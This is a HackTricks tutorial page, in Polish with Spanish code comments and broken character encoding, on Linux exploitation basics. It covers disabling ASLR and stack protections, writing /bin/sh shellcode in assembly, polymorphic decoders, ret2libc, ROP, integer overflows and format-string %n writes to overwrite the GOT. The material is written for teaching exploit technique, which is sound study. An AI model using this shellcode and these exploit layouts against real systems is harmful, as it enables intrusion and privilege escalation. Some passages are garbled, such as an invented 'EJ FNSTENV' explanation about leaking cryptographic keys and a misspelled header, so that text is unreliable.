# Linux Exploiting (Podstawy) (SPA)

## Linux Exploiting (Podstawy) (SPA)

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia dla HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **ASLR**

Aleatoryzacja adresÃ³w

**WyÅ‚Ä…cz globalnÄ… aleatoryzacjÄ™ (ASLR) (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
WÅ‚Ä…cz ponownie globalnÄ… aleatoryzacjÄ™: echo 2 > /proc/sys/kernel/randomize\_va\_space

**WyÅ‚Ä…cz dla jednego wykonania** (nie wymaga uprawnieÅ„ root):\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**WyÅ‚Ä…cz ochronÄ™ wykonania na stosie**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**Plik core**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Tekst**\
**Dane**\
**BSS**\
**Sterta**

**Stos**

**Sekcja BSS**: Niezainicjowane zmienne globalne lub statyczne
```
static int i;
```
**Sekcja DANE**: Zmienne globalne lub statyczne zainicjowane
```
int i = 5;
```
**Sekcja TEXT**: Instrukcje kodu (opcodes)

**Sekcja HEAP**: Bufory rezerwowane dynamicznie (malloc(), calloc(), realloc())

**Sekcja STACK**: Stos (przekazywane argumenty, zmienne lokalne, Å›rodowisko Å‚aÅ„cuchÃ³w znakowych (env) ...)

## **1. PRZEPEÅNIENIA STOSU**

> przepeÅ‚nienie bufora, przepeÅ‚nienie stosu, nadpisanie stosu, zniszczenie stosu

BÅ‚Ä…d segmentacji lub naruszenie segmentu: Gdy prÃ³buje siÄ™ uzyskaÄ‡ dostÄ™p do adresu pamiÄ™ci, ktÃ³ry nie zostaÅ‚ przypisany do procesu.

Aby uzyskaÄ‡ adres funkcji w programie, moÅ¼na uÅ¼yÄ‡:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### WywoÅ‚anie sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

SprawdÅº przerwania jÄ…dra: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; wyczyÅ›Ä‡ eax\
xor ebx, ebx ; ebx = 0, nie ma argumentu do przekazania\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Wykonaj syscall

**nasm -f elf assembly.asm** â€”> Zwraca plik .o\
**ld assembly.o -o shellcodeout** â€”> Tworzy wykonywalny plik z kodem asemblera, a nastÄ™pnie moÅ¼emy uzyskaÄ‡ opkody za pomocÄ… **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Aby sprawdziÄ‡, czy to jest nasz shellcode i uzyskaÄ‡ opkody

**SprawdÅº, czy shellcode dziaÅ‚a**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby sprawdziÄ‡, czy wywoÅ‚ania systemowe sÄ… wykonywane poprawnie, naleÅ¼y skompilowaÄ‡ poprzedni program, a nastÄ™pnie wywoÅ‚aÄ‡ **strace ./SKOMPILOWANY\_PROGRAM**.

Podczas tworzenia shellcode'u moÅ¼na zastosowaÄ‡ sztuczkÄ™. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie to wywoÅ‚uje oryginalny kod i dodaje EIP do stosu. Po instrukcji wywoÅ‚ania wstawiamy potrzebny nam ciÄ…g znakÃ³w, dziÄ™ki czemu moÅ¼emy wskazaÄ‡ na ten ciÄ…g znakÃ³w za pomocÄ… EIP i kontynuowaÄ‡ wykonywanie kodu.

PRZYKÅAD **SZTUCZKI (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**UÅ¼ycie Stacka (/bin/sh):**

Aby wykorzystaÄ‡ podatnoÅ›Ä‡ stosu i uzyskaÄ‡ dostÄ™p do powÅ‚oki systemowej (/bin/sh), wykonaj nastÄ™pujÄ…ce kroki:

1. Zidentyfikuj podatnÄ… aplikacjÄ™ lub usÅ‚ugÄ™, ktÃ³ra umoÅ¼liwia manipulacjÄ™ stosu.
2. Zlokalizuj miejsce w kodzie, gdzie wystÄ™puje podatnoÅ›Ä‡ na przepeÅ‚nienie bufora.
3. Przygotuj odpowiednio spreparowany bufor, ktÃ³ry spowoduje przepeÅ‚nienie stosu.
4. Wstrzyknij kod, ktÃ³ry spowoduje wykonanie polecenia `/bin/sh`.
5. Uruchom atak, aby wywoÅ‚aÄ‡ przepeÅ‚nienie bufora i uzyskaÄ‡ dostÄ™p do powÅ‚oki systemowej.

PoniÅ¼ej przedstawiono przykÅ‚adowy kod w jÄ™zyku C, ktÃ³ry demonstruje wykorzystanie podatnoÅ›ci stosu:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[10];
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    vulnerable_function(argv[1]);

    printf("Program executed successfully!\n");

    return 0;
}
```

W powyÅ¼szym przykÅ‚adzie funkcja `vulnerable_function` jest podatna na przepeÅ‚nienie bufora. Aby wywoÅ‚aÄ‡ powÅ‚okÄ™ systemowÄ…, wystarczy przekazaÄ‡ odpowiednio dÅ‚ugi ciÄ…g znakÃ³w jako argument wiersza poleceÅ„.

**Uwaga:** Wykorzystywanie podatnoÅ›ci stosu jest nielegalne i narusza prywatnoÅ›Ä‡ i bezpieczeÅ„stwo systemÃ³w. Niniejsze informacje majÄ… na celu jedynie cel edukacyjny i nie powinny byÄ‡ stosowane w celach niezgodnych z prawem.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV (Execute FNSTENV) is a technique used in Linux exploitation to execute the FNSTENV instruction. This instruction is responsible for saving the FPU environment to memory. By executing this instruction, we can leak the FPU state and retrieve sensitive information such as cryptographic keys.

To perform EJ FNSTENV, we need to find a vulnerable program that allows us to control the FPU state. Once we have control, we can execute the FNSTENV instruction and retrieve the leaked data.

This technique is commonly used in privilege escalation attacks, where an attacker gains elevated privileges by exploiting a vulnerability in a program. By leaking sensitive information, the attacker can further exploit the system and gain full control.

It is important to note that EJ FNSTENV is just one of many techniques used in Linux exploitation. It requires a deep understanding of the underlying system and the vulnerability being exploited.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Hunter:**

Polega na maÅ‚ym kodzie, ktÃ³ry przeszukuje strony pamiÄ™ci przypisane do procesu w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy mamy tylko maÅ‚Ä… przestrzeÅ„ do wstrzykniÄ™cia kodu.

**Shellkody polimorficzne**

SÄ… to zaszyfrowane shelle, ktÃ³re majÄ… maÅ‚y kod, ktÃ³ry je deszyfruje i skacze do niego, uÅ¼ywajÄ…c sztuczki Call-Pop. Oto **przykÅ‚ad zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Atakowanie wskaÅºnika ramki (EBP)**

Przydatne w sytuacji, gdy moÅ¼emy zmodyfikowaÄ‡ EBP, ale nie EIP.

Wiadomo, Å¼e po opuszczeniu funkcji wykonuje siÄ™ nastÄ™pujÄ…cy kod assemblerowy:
```
movl               %ebp, %esp
popl                %ebp
ret
```
W ten sposÃ³b, jeÅ›li moÅ¼na zmieniÄ‡ EBP przy wyjÅ›ciu z funkcji (fvuln), ktÃ³ra zostaÅ‚a wywoÅ‚ana przez innÄ… funkcjÄ™, gdy funkcja wywoÅ‚ujÄ…ca fvuln siÄ™ zakoÅ„czy, jej EIP moÅ¼e zostaÄ‡ zmieniony.

W fvuln moÅ¼na wprowadziÄ‡ faÅ‚szywy EBP, ktÃ³ry wskazuje na miejsce, gdzie znajduje siÄ™ adres shellcode + 4 (trzeba dodaÄ‡ 4 ze wzglÄ™du na pop). W ten sposÃ³b, po wyjÅ›ciu z funkcji, wartoÅ›Ä‡ &(\&Shellcode)+4 zostanie umieszczona w ESP, a pop odjÄ™cie 4 od ESP spowoduje, Å¼e wskaÅ¼e on adres shellcode, gdy zostanie wykonane ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + wypeÅ‚nienie + &(\&Shellcode)+4

**Exploit Off-by-One**\
MoÅ¼na zmieniÄ‡ tylko najmniej znaczÄ…cy bajt EBP. MoÅ¼na przeprowadziÄ‡ atak jak powyÅ¼ej, ale pamiÄ™Ä‡ przechowujÄ…ca adres shellcode musi dzieliÄ‡ 3 pierwsze bajty z EBP.

## **4. Metody return to Libc**

Metoda przydatna, gdy stos nie jest wykonywalny lub pozostawia zbyt maÅ‚y bufor do modyfikacji.

ASLR powoduje, Å¼e w kaÅ¼dym uruchomieniu funkcje sÄ… Å‚adowane na rÃ³Å¼ne pozycje w pamiÄ™ci. Dlatego ta metoda moÅ¼e nie byÄ‡ skuteczna w tym przypadku. Dla zdalnych serwerÃ³w, poniewaÅ¼ program jest wykonywany ciÄ…gle pod tym samym adresem, moÅ¼e byÄ‡ przydatna.

* **cdecl (C declaration)** Umieszcza argumenty na stosie i po wyjÅ›ciu z funkcji czyÅ›ci stos
* **stdcall (standardowe wywoÅ‚anie)** Umieszcza argumenty na stosie i to wywoÅ‚ana funkcja go czyÅ›ci
* **fastcall** Umieszcza dwa pierwsze argumenty w rejestrach, a resztÄ™ na stosie

Wstawiamy adres instrukcji system z biblioteki libc i przekazujemy go jako argument dla ciÄ…gu znakÃ³w "/bin/sh", zwykle z zmiennej Å›rodowiskowej. Ponadto, uÅ¼ywamy adresu funkcji exit, aby po zakoÅ„czeniu korzystania z powÅ‚oki program zakoÅ„czyÅ‚ siÄ™ bez problemÃ³w (i zapisywaÅ‚ logi).

**export SHELL=/bin/sh**

Aby znaleÅºÄ‡ potrzebne adresy, moÅ¼na sprawdziÄ‡ w **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** â€”> Daje adres wszystkich funkcji uÅ¼ywanych przez program podczas Å‚adowania\
(WewnÄ…trz startu lub jakiegoÅ› punktu przerwania): **x/500s $esp** â€”> Szukamy tutaj ciÄ…gu znakÃ³w /bin/sh

Po uzyskaniu tych adresÃ³w **exploit** wyglÄ…daÅ‚by tak:

"A" \* ODLEGÅOÅšÄ† EBP + 4 (EBP: mogÄ… to byÄ‡ 4 "A", ale lepiej, jeÅ›li to jest rzeczywisty EBP, aby uniknÄ…Ä‡ bÅ‚Ä™dÃ³w segmentacji) + Adres **system** (nadpisze EIP) + Adres **exit** (po wywoÅ‚aniu system("/bin/sh") ta funkcja zostanie wywoÅ‚ana, poniewaÅ¼ pierwsze 4 bajty stosu sÄ… traktowane jako nastÄ™pny adres EIP do wykonania) + Adres "*/bin/sh*" (bÄ™dzie to parametr przekazany do system)

W ten sposÃ³b EIP zostanie nadpisany adresem system, ktÃ³ry otrzyma jako parametr ciÄ…g znakÃ³w "/bin/sh", a po wyjÅ›ciu z niego zostanie wykonana funkcja exit().

MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e ktÃ³ryÅ› bajt z adresu jakiejÅ› funkcji bÄ™dzie zerowy lub spacja (\x20). W takim przypadku moÅ¼na rozÅ‚oÅ¼yÄ‡ na czÄ™Å›ci adresy poprzedzajÄ…ce tÄ™ funkcjÄ™, poniewaÅ¼ prawdopodobnie bÄ™dÄ… tam kilka NOP-Ã³w, ktÃ³re pozwolÄ… nam wywoÅ‚aÄ‡ jeden z nich zamiast funkcji bezpoÅ›rednio (na przykÅ‚ad za pomocÄ… > x/8i system-4).

Ta metoda dziaÅ‚a, poniewaÅ¼ wywoÅ‚ujÄ…c funkcjÄ™ jak system za pomocÄ… opcode'u **ret** zamiast **call**, funkcja rozumie, Å¼e pierwsze 4 bajty bÄ™dÄ… adresem **EIP**, do ktÃ³rego naleÅ¼y powrÃ³ciÄ‡.

InteresujÄ…cÄ… technikÄ… z wykorzystaniem tej metody jest wywoÅ‚anie **strncpy()**, aby przenieÅ›Ä‡ Å‚adunek ze stosu do sterty, a nastÄ™pnie uÅ¼yÄ‡ **gets()**, aby wykonaÄ‡ ten Å‚adunek.

InnÄ… interesujÄ…cÄ… technikÄ… jest uÅ¼ycie **mprotect()**, ktÃ³ra pozwala przypisaÄ‡ Å¼Ä…dane uprawnienia do dowolnej czÄ™Å›ci pamiÄ™ci. DziaÅ‚aÅ‚a lub dziaÅ‚aÅ‚a w BDS, MacOS i OpenBSD, ale nie w systemie Linux (kontroluje, czy nie moÅ¼na jednoczeÅ›nie przyznaÄ‡ uprawnieÅ„ do zapisu i wykonania). Za pomocÄ… tego ataku moÅ¼na przywrÃ³ciÄ‡ stos jako wykonywalny.

**ÅÄ…czenie funkcji**

OpierajÄ…c siÄ™ na poprzedniej technice, ta forma exploitu polega na:\
WypeÅ‚nienie + \&Funkcja1 + \&pop;ret; + \&arg\_fun1 + \&Funkcja2 + \&pop;ret; + \&arg\_fun2 + ...

W ten sposÃ³b moÅ¼na Å‚Ä…czyÄ‡ funkcje, do ktÃ³rych moÅ¼na siÄ™ odwoÅ‚aÄ‡. Ponadto, jeÅ›li chcesz uÅ¼yÄ‡ funkcji z kilkoma argumentami, moÅ¼na umieÅ›ciÄ‡ potrzebne argumenty (np. 4) i umieÅ›ciÄ‡ 4 argumenty i znaleÅºÄ‡ adres w miejscu z opcode'ami: pop, pop, pop, pop, ret â€”> **objdump -d executable**

**ÅÄ…czenie przez faÅ‚szowanie ramek (Å‚Ä…czenie EBPs)**

Polega na wykorzystaniu moÅ¼liwoÅ›ci manipulacji EBP do Å‚Ä…czenia wykonania kilku funkcji za pomocÄ… EBP i "leave;ret"

WypeÅ‚nienie

* Umieszczamy w EBP faÅ‚szywy EBP, ktÃ³ry wskazuje na: 2. faÅ‚szywy EBP + funkcjÄ™ do wykonania: (\&system() + \&leave;ret + &"/bin/sh")
* W EIP umieszczamy jako adres funkcji &(leave;ret)

Rozpoczynamy shellcode od adresu nastÄ™pnej czÄ™Å›ci shellcode, na przykÅ‚ad: 2. faÅ‚szywy EBP + \&system() + &(leave;ret;) + &"/bin/sh"

2. faÅ‚szywy EBP to: 3. faÅ‚szywy EBP + \&system() + &(leave;ret;) + &"/bin/ls"

Ten shellcode moÅ¼na powtarzaÄ‡ w nieskoÅ„czonoÅ›Ä‡ w dostÄ™pnych czÄ™Å›ciach pamiÄ™ci, dziÄ™ki czemu Å‚atwo podzieli siÄ™ go na maÅ‚e fragmenty pamiÄ™ci.

(ÅÄ…czy siÄ™ wykonanie funkcji, Å‚Ä…czÄ…c wczeÅ›niej omÃ³wione podatnoÅ›ci EBP i ret2lib)

## **5. Metody uzupeÅ‚niajÄ…ce**

**Ret2Ret**

Przydatne, gdy nie moÅ¼na umieÅ›ciÄ‡ adresu ze stosu w EIP (sprawdzane jest, czy EIP nie zawiera 0xbf) lub gdy nie moÅ¼na obliczyÄ‡ lokalizacji shellcode. Jednak funkcja podatna akceptuje parametr (shellcode zostanie umieszczony tutaj).

W ten sposÃ³b, zmieniajÄ…c EIP na adres **ret**, zostanie zaÅ‚adowany nastÄ™pny adres (ktÃ³ry jest adresem pierwszego argumentu funkcji). Innymi sÅ‚owy, zostanie zaÅ‚adowana shellcode.

Exploit wyglÄ…daÅ‚by tak: SHELLCODE + WypeÅ‚nienie (do EIP) + **\&ret** (nastÄ™pne bajty stosu wskazujÄ… na poczÄ…tek shellcode, poniewaÅ¼ na stosie umieszczony jest adres przekazanego parametru)

WyglÄ…da na to, Å¼e funkcje takie jak **strncpy** po zakoÅ„czeniu usuwajÄ… ze stosu adres, w ktÃ³rym przechowywana byÅ‚a shellcode, uniemoÅ¼liwiajÄ…c zastosowanie tej techniki. Innymi sÅ‚owy, adres przekazywany do funkcji jako argument (ten, ktÃ³ry przechowuje shellcode) jest zmieniany na 0x00, wiÄ™c po wywoÅ‚aniu drugiego **ret** napotyka na 0x00 i program siÄ™ zawiesza.
```
**Ret2PopRet**
```
JeÅ›li nie mamy kontroli nad pierwszym argumentem, ale mamy nad drugim lub trzecim, moÅ¼emy nadpisaÄ‡ EIP adresem pop-ret lub pop-pop-ret, w zaleÅ¼noÅ›ci od potrzeb.

**Metoda Murata**

W systemie Linux wszystkie programy sÄ… mapowane zaczynajÄ…c od 0xbfffffff.

AnalizujÄ…c, jak jest tworzony stos nowego procesu w systemie Linux, moÅ¼na opracowaÄ‡ exploit, ktÃ³ry uruchamia program w Å›rodowisku, w ktÃ³rym jedynÄ… zmiennÄ… jest shellcode. Adres tej zmiennej moÅ¼na obliczyÄ‡ jako: addr = 0xbfffffff - 4 - strlen(NAZWA_peÅ‚na_Å›cieÅ¼ka_do_wykonawczego) - strlen(shellcode)

W ten sposÃ³b moÅ¼na Å‚atwo uzyskaÄ‡ adres zmiennej Å›rodowiskowej zawierajÄ…cej shellcode.

Jest to moÅ¼liwe dziÄ™ki funkcji execle, ktÃ³ra pozwala tworzyÄ‡ Å›rodowisko zawierajÄ…ce tylko wybrane zmienne Å›rodowiskowe.

**Skok do ESP: styl Windows**

PoniewaÅ¼ ESP zawsze wskazuje na poczÄ…tek stosu, ta technika polega na zastÄ…pieniu EIP adresem skoku do **jmp esp** lub **call esp**. W ten sposÃ³b shellcode jest zapisywany po nadpisaniu EIP, poniewaÅ¼ po wykonaniu instrukcji **ret** ESP wskazuje na nastÄ™pny adres, dokÅ‚adnie tam, gdzie zapisano shellcode.

JeÅ›li w systemie Windows lub Linux nie jest aktywna technika ASLR, moÅ¼na wywoÅ‚aÄ‡ **jmp esp** lub **call esp**, ktÃ³re sÄ… przechowywane w jakimÅ› wspÃ³Å‚dzielonym obiekcie. JeÅ›li ASLR jest aktywne, moÅ¼na je znaleÅºÄ‡ w samym podatnym programie.

Dodatkowo, moÅ¼liwoÅ›Ä‡ umieszczenia shellcode po nadpisaniu EIP zamiast w Å›rodku stosu pozwala uniknÄ…Ä‡ dotkniÄ™cia jej przez instrukcje push lub pop, ktÃ³re mogÄ… byÄ‡ wykonywane w trakcie dziaÅ‚ania funkcji.

Podobnie, jeÅ›li wiemy, Å¼e funkcja zwraca adres, pod ktÃ³rym znajduje siÄ™ shellcode, moÅ¼na wywoÅ‚aÄ‡ **call eax** lub **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) lub poÅ¼yczone fragmenty kodu**

WywoÅ‚ywane fragmenty kodu nazywane sÄ… gadÅ¼etami.

Ta technika polega na Å‚Ä…czeniu rÃ³Å¼nych wywoÅ‚aÅ„ funkcji za pomocÄ… techniki **ret2libc** i uÅ¼ycia **pop,ret**.

W niektÃ³rych architekturach procesorÃ³w kaÅ¼da instrukcja skÅ‚ada siÄ™ z 32 bitÃ³w (np. MIPS). Jednak w przypadku procesorÃ³w Intel instrukcje majÄ… zmiennÄ… dÅ‚ugoÅ›Ä‡, a kilka instrukcji moÅ¼e dzieliÄ‡ ten sam zestaw bitÃ³w, na przykÅ‚ad:

**movl $0xe4ff, -0x(%ebp)** â€”> Zawiera bajty 0xffe4, ktÃ³re moÅ¼na rÃ³wnieÅ¼ przetÅ‚umaczyÄ‡ jako: **jmp \*%esp**

W ten sposÃ³b moÅ¼na wykonywaÄ‡ instrukcje, ktÃ³re nie sÄ… nawet w oryginalnym programie.

**ROPgadget.py** pomaga nam znaleÅºÄ‡ wartoÅ›ci w plikach binarnych.

Ten program sÅ‚uÅ¼y rÃ³wnieÅ¼ do tworzenia **payloadÃ³w**. MoÅ¼esz podaÄ‡ mu bibliotekÄ™, z ktÃ³rej chcesz wyciÄ…gnÄ…Ä‡ ROP-y, a on wygeneruje gotowy do uÅ¼ycia jako shellcode payload w jÄ™zyku Python. Ponadto, poniewaÅ¼ korzysta z wywoÅ‚aÅ„ systemowych, nie wykonuje niczego na stosie, tylko zapisuje adresy ROP-Ã³w, ktÃ³re zostanÄ… wykonane za pomocÄ… instrukcji **ret**. Aby uÅ¼yÄ‡ tego payloadu, naleÅ¼y wywoÅ‚aÄ‡ go za pomocÄ… instrukcji **ret**.

**PrzepeÅ‚nienia liczb caÅ‚kowitych**

Tego rodzaju przepeÅ‚nienia wystÄ™pujÄ…, gdy zmienna nie jest przygotowana na obsÅ‚ugÄ™ tak duÅ¼ej liczby, jakÄ… jej podajemy, byÄ‡ moÅ¼e z powodu pomyÅ‚ki miÄ™dzy zmiennymi ze znakiem a bez znaku, na przykÅ‚ad:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
W poprzednim przykÅ‚adzie widzimy, Å¼e program oczekuje dwÃ³ch parametrÃ³w. Pierwszy to dÅ‚ugoÅ›Ä‡ nastÄ™pnego ciÄ…gu, a drugi to ciÄ…g.

JeÅ›li podamy jako pierwszy parametr liczbÄ™ ujemnÄ…, zostanie wyÅ›wietlone, Å¼e len < 256 i przejdziemy przez ten filtr, a takÅ¼e strlen(buffer) bÄ™dzie mniejsze niÅ¼ l, poniewaÅ¼ l jest typu unsigned int i bÄ™dzie bardzo duÅ¼e.

Ten rodzaj przepeÅ‚nienia nie ma na celu zapisania czegoÅ› w procesie programu, ale przejÅ›cie przez Åºle zaprojektowane filtry w celu wykorzystania innych podatnoÅ›ci.

**Nie zainicjalizowane zmienne**

Nie wiadomo, jakÄ… wartoÅ›Ä‡ moÅ¼e przyjÄ…Ä‡ niezainicjalizowana zmienna, i moÅ¼e byÄ‡ interesujÄ…ce to obserwowaÄ‡. MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e przyjmie wartoÅ›Ä‡, ktÃ³rÄ… przyjmowaÅ‚a zmienna z poprzedniej funkcji, a ta moÅ¼e byÄ‡ kontrolowana przez atakujÄ…cego.

## **Formatowanie ciÄ…gÃ³w**

W jÄ™zyku C funkcja **`printf`** moÅ¼e byÄ‡ uÅ¼ywana do **wyÅ›wietlania** pewnego ciÄ…gu znakÃ³w. **Pierwszy parametr**, ktÃ³ry oczekuje ta funkcja, to **surowy tekst z formatami**. **NastÄ™pne parametry** oczekiwane sÄ… jako **wartoÅ›ci**, ktÃ³re majÄ… **zastÄ…piÄ‡ formaty** w surowym tekÅ›cie.

PodatnoÅ›Ä‡ pojawia siÄ™, gdy **atakujÄ…cy tekst jest umieszczany jako pierwszy argument** tej funkcji. AtakujÄ…cy bÄ™dzie w stanie stworzyÄ‡ **specjalne dane, wykorzystujÄ…c moÅ¼liwoÅ›ci formatowania printf**, aby **zapisaÄ‡ dowolne dane pod dowolnym adresem**. W ten sposÃ³b moÅ¼liwe jest **wykonanie dowolnego kodu**.

Formaty:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **zapisuje** **liczbÄ™ zapisanych bajtÃ³w** pod wskazany adres. Poprzez zapisanie **odpowiedniej liczby bajtÃ³w** w postaci heksadecymalnej, moÅ¼emy **zapisaÄ‡ dowolne dane**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

To jest tabela zawierajÄ…ca **adresy** **funkcji zewnÄ™trznych** uÅ¼ywanych przez program.

Aby uzyskaÄ‡ adres do tej tabeli, uÅ¼yj: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

ZauwaÅ¼, Å¼e po **zaÅ‚adowaniu** pliku **wykonywalnego** w GEF moÅ¼esz **zobaczyÄ‡** **funkcje**, ktÃ³re znajdujÄ… siÄ™ w **GOT**: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Za pomocÄ… GEF moÅ¼esz **rozpoczÄ…Ä‡** sesjÄ™ **debugowania** i wykonaÄ‡ **`got`**, aby zobaczyÄ‡ tabelÄ™ got:

![](<../../.gitbook/assets/image (621).png>)

W pliku binarnym GOT zawiera **adresy funkcji lub** sekcji **PLT**, ktÃ³ra zaÅ‚aduje adres funkcji. Celem tego ataku jest **nadpisanie wpisu GOT** funkcji, ktÃ³ra zostanie wykonana pÃ³Åºniej, **adresem** PLT funkcji **`system`**. Idealnie byÅ‚oby **nadpisaÄ‡** GOT **funkcji**, ktÃ³ra jest **wywoÅ‚ywana z parametrami kontrolowanymi przez ciebie** (dziÄ™ki temu bÄ™dziesz mÃ³gÅ‚ kontrolowaÄ‡ parametry przesyÅ‚ane do funkcji systemowej).

JeÅ›li **`system`** **nie jest uÅ¼ywany** przez skrypt, funkcja systemowa **nie** bÄ™dzie miaÅ‚a wpisu w GOT. W takim przypadku **naleÅ¼y najpierw ujawniÄ‡ adres** funkcji `system`.

**Procedure Linkage Table** to **tabela tylko do odczytu** w pliku ELF, ktÃ³ra przechowuje wszystkie niezbÄ™dne **symbole wymagajÄ…ce rozwiÄ…zania**. Gdy jedna z tych funkcji zostanie wywoÅ‚ana, **GOT** przekieruje **przepÅ‚yw** do **PLT**, aby rozwiÄ…zaÄ‡ **adres** funkcji i zapisaÄ‡ go w GOT.\
NastÄ™pnie, **przy kolejnym** wywoÅ‚aniu pod tego adresu **funkcja** jest **wywoÅ‚ywana bezpoÅ›rednio**, bez koniecznoÅ›ci rozwiÄ…zywania jej.

